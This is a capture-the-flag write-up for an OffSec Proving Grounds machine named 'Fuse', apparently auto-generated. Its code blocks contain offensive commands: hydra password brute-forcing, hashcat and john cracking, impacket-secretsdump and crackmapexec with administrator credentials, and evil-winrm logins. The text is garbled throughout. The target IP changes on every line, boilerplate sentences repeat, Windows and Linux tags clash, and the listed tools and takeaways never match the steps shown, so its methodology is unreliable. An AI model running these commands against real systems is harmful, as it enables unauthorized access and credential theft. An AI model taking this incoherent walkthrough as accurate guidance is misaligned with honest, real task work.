---
TitleSEO: "OffSec Proving Grounds — Fuse (Medium Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Fuse (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Fuse. LAPS Abuse and NFS No Root Squash to achieve medium compromise on Windows."
Keywords: "hard, linux, easy"
URL: "https://zurefx.github.io/writeups/htb-fuse-708.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-fuse-708/"
Date: "2024-06-26"
Tags: "Hard, Linux, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-fuse-708"
Permalink: "/writeups/htb-fuse-708.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Fuse** is rated **Medium** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.12.77.177`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.21.196.119 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p3268,22,23 10.97.10.5 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.156.184/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.30.240.20/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.45.207.161 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
evil-winrm -i 10.101.235.13 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p464,5432,143 10.122.125.251 -oN scan.txt
crackmapexec smb 10.32.95.64 -u administrator -p 'P@ssw0rd!' --shares
```

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **NFS No Root Squash**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.111.74.197 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.76.27.216
```

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
evil-winrm -i 10.125.116.99 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.54.71.75/FUZZ
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.65.151.178 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.101.95.147
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.61.229.201/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `GetUserSPNs`
- `smbexec`
- `rubeus`
- `chisel`

### Key Takeaways

- LAPS Abuse
- NFS No Root Squash
- Writable PATH
- Cron Job
